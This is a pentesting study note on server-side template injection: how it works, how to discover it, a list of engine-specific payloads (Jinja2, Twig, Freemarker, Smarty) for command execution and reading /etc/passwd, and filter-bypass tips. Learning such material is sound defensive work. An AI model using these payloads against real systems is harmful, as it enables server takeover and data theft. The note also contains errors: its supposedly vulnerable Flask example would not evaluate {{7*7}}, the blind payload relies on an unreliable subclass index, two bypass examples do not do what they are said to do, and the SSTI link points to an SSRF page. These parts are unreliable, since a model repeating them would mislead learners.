# Index
- [[Back End Vulnerabilities]]
	- [[1. Insecure File Uploads]]
	- [[2. File Inclusion]]
	- [[3. Command Injection]]
	- [[4. SQL Injection (SQLi)]]
	- [[5. Server-Side Request Forgery (SSRF)]]
	- [[6. Server-Side Template Injection (SSTi)]]
	- [[7. XML External Entity (XXE)]]
	- [[8. Insecure Deserialization]]

# Server-Side Template Injection (SSTI)

Server-Side Template Injection (SSTI) is a vulnerability that occurs when an attacker can inject and execute arbitrary code on the server via template engines used to dynamically render web pages. Template engines like Twig, Jinja2, Velocity, Freemarker, and Smarty are used in web applications to render HTML, emails, and other types of dynamic content based on server-side templates. However, if the application directly embeds untrusted user input into the template without proper sanitization, it opens the door for attackers to inject malicious code.

SSTI allows attackers to execute code in the context of the template engine, which often runs with elevated privileges. Depending on the template engine used, attackers can exploit SSTI to achieve remote code execution (RCE), steal sensitive data, read server files, or perform other malicious actions on the server.

# How Server-Side Template Injection Works

Server-Side Template Injection vulnerabilities arise when user input is directly embedded into templates without proper sanitization or escaping. Below is a breakdown of how SSTI works:

1. **User Input Injected into Templates:** A web application uses a template engine to render dynamic content, and user input is incorporated directly into the template (e.g., inside placeholders or variables).
   - Example: A web page allows users to input their name, which is included in the rendered template:
     ```python
     template = "Hello, {{ name }}!"
     result = template_engine.render(template, name=user_input)
     ```
2. **Attacker Injects Malicious Code:** Instead of submitting benign input (like their name), the attacker provides input designed to exploit the template engine's capabilities. This input may include template syntax that executes code.
   - Example: The attacker submits `{{ 7 * 7 }}`, which could lead to the evaluation of the expression inside the template:
     ```
     "Hello, 49!"
     ```
3. **Template Engine Executes Code:** The template engine interprets and executes the injected code within the context of the server. Depending on the template engine's power, the attacker can escalate the attack from simple arithmetic to executing server-side code.
   - Example: The attacker injects a payload to read files or execute system commands (RCE):
     ```
     {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
     ```
4. **Attacker Gains Control:** The attacker can now execute arbitrary commands on the server, steal sensitive data, interact with the server's file system, or pivot to other parts of the internal network. The severity of SSTI depends on the specific template engine used and how much control it provides over server-side resources.

# Types of Server-Side Template Injection

SSTI vulnerabilities can manifest in different ways, depending on how the input is processed and what capabilities the template engine offers. Below are the main types of SSTI:

## Simple Template Injection
- This occurs when the application embeds user input directly into the template without proper validation. The attacker can inject simple payloads that leverage the template engine's native capabilities (e.g., arithmetic, variable evaluation).

### How Simple SSTI Works
1. The application renders a template using user input without escaping it.
2. The attacker injects template syntax into the input field, which is evaluated by the template engine.
3. The template engine renders the result, including any attacker-controlled output.

**Example:**
```
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name')
    template = '<h1>Hello, {{ name }}!</h1>'
    return render_template_string(template, name=name)

if __name__ == '__main__':
    app.run()
```

If an attacker submits a payload like `{{ 7*7 }}`, the rendered output would be `Hello, 49!`. This demonstrates the template engine's ability to execute expressions.

## Advanced Template Injection (Remote Code Execution)
- Some template engines allow access to advanced server-side objects (e.g., file systems, processes), leading to arbitrary code execution. This often results in full server compromise.

### How Advanced SSTI Works
1. The attacker identifies the template engine in use (e.g., Jinja2, Twig, or Freemarker).
2. They craft an SSTI payload that abuses internal objects or functions of the template engine.
3. The template engine evaluates the malicious payload, leading to remote code execution (RCE).

**Example:**
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```
This payload executes the `id` command on the server and returns the result.

## Blind Template Injection
- Blind SSTI occurs when the output of the template injection is not directly visible to the attacker. In these cases, the attacker relies on indirect methods (e.g., time delays, file writes, or out-of-band techniques) to verify whether the injection worked.

### How Blind SSTI Works
1. The attacker injects a template payload but does not see immediate feedback.
2. They use time-based payloads (e.g., `sleep`) or out-of-band channels to confirm that the injection worked.
3. Based on timing or external evidence, the attacker determines the success of the injection.

**Example:**
```
{{ ''.__class__.__mro__[1].__subclasses__()[40]('sleep 5',shell=True).communicate() }}
```
If the server takes 5 seconds to respond, the attacker knows the SSTI worked.

# Manual Discovery Techniques for SSTI

There are several manual techniques to discover and exploit Server-Side Template Injection vulnerabilities:

## 1. Identify Dynamic Content in Templates
- Look for any user input that is reflected in rendered templates (e.g., HTML, emails, or error messages). Common areas include:
  - User profile pages that display custom data.
  - Email templates that use user-defined input.
  - Feedback forms, comments, or message boards.

## 2. Inject Simple Template Syntax
- Inject template syntax (e.g., `{{ }}` for Jinja2 or Twig) into input fields or URL parameters to see if it is processed and executed.
  
  **Example (Testing for Jinja2 or Twig):**
  ```
  {{ 7 * 7 }}
  ```
  If the output shows `49`, the application is vulnerable to SSTI.

## 3. Fuzzing for Template Syntax
- Use fuzzing tools like Burp Suite Intruder or manual injections to try different template engine syntaxes (e.g., `${}`, `{{}}`, `<%= %>`). Each template engine has its own syntax and behavior.
  
  **Example Fuzzing Payloads:**
  ```
  {{ 7 * 7 }}
  ${7 * 7}
  <%= 7 * 7 %>
  ```

## 4. Inspect for Error Messages
- If your initial payloads are not evaluated, try injecting broken template syntax to generate error messages. Template engines often return descriptive error messages, which can help identify the engine in use.
  
  **Example (Testing for Jinja2):**
  ```
  {{ invalid_variable }}
  ```
  An error message like `UndefinedError: 'invalid_variable' is undefined` may reveal the use of Jinja2.

## 5. Test for Blind SSTI with Time Delays
- If the output is not visible, use time-based payloads (e.g., `sleep`) to detect SSTI. This is useful for blind injection scenarios.

  **Example (Testing for Blind SSTI):**
  ```
  {{ ''.__class__.__mro__[1].__subclasses__()[40]('sleep 5',shell=True).communicate() }}
  ```

  If the server delays the response by 5 seconds, SSTI is likely present.

# SSTI Payloads

Here are common payloads for exploiting Server-Side Template Injection vulnerabilities:

### 1. Basic Template Injection Payload
- Evaluate basic expressions or arithmetic to test for SSTI.
  ```
  {{ 7 * 7 }}
  ```

### 2. Jinja2 Remote Code Execution (RCE)
- Execute system commands by abusing Jinja2’s access to internal objects.
  ```
  {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
  ```

### 3. Twig Remote Code Execution (RCE)
- Exploit Twig’s internal objects to execute arbitrary commands.
  ```
  {{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}
  ```

### 4. Freemarker RCE
- Freemarker payload for accessing the file system and reading sensitive files.
  ```
  ${''.getClass().forName('java.lang.Runtime').getRuntime().exec('cat /etc/passwd')}
  ```

### 5. Smarty Template RCE
- Smarty template engine payload for executing shell commands.
  ```
  {system('id')}
  ```

### 6. Blind SSTI Payload (Time Delay)
- Use a time-based payload to confirm blind SSTI.
  ```
  {{ ''.__class__.__mro__[1].__subclasses__()[40]('sleep 5',shell=True).communicate() }}
  ```

# Bypassing Defenses

Attackers often need to bypass security mechanisms such as input validation or template engine restrictions. Here are some techniques to bypass defenses in SSTI:

## Bypass Input Validation
- Applications may block certain keywords or characters used in template syntax (like `{{` or `${}`). Try encoding or obfuscating payloads:
  - **URL Encoding:** `%7B%7B 7 * 7 %7D%7D`
  - **String Concatenation:**
    ```
    {{ 7 + 7 }}
    ```

## Bypass Blacklists
- If certain keywords or functions are blacklisted, you can use alternative methods to achieve the same goal:
  - **Alternative Functions:** Use functions with the same functionality but different names (e.g., use `__import__('os')` instead of `os` in Python).
  
## Exploit Template Filters
- Some template engines allow filters that can be abused to access dangerous functionality:
  ```
  {{ user|length }}
  ```

## Chain SSTI with Other Vulnerabilities
- Combine SSTI with other vulnerabilities, like command injection or file inclusion, to escalate the attack. For example, you could use SSTI to include a file or execute system commands.

## Use Object Property Access (in Python-based Engines)
- In Python-based template engines like Jinja2, access sensitive internal properties using object method resolution:
  ```
  {{ ''.__class__.__mro__[1].__subclasses__() }}
  ```

# Resources

|**Website**|**URL**|
|-|-|
|OWASP SSTI|https://owasp.org/www-community/attacks/Server_Side_Template_Injection|
|PortSwigger SSTI|https://portswigger.net/web-security/ssrf|
|PayloadAllTheThings (SSTI)|https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection|
|HackTricks SSTI Guide|https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection|
|Exploit Database SSTI|https://www.exploit-db.com/|
|Jinja2 Documentation|https://jinja.palletsprojects.com/en/3.0.x/|
|Freemarker Template Engine|https://freemarker.apache.org/|
|Smarty Template Engine|https://www.smarty.net/|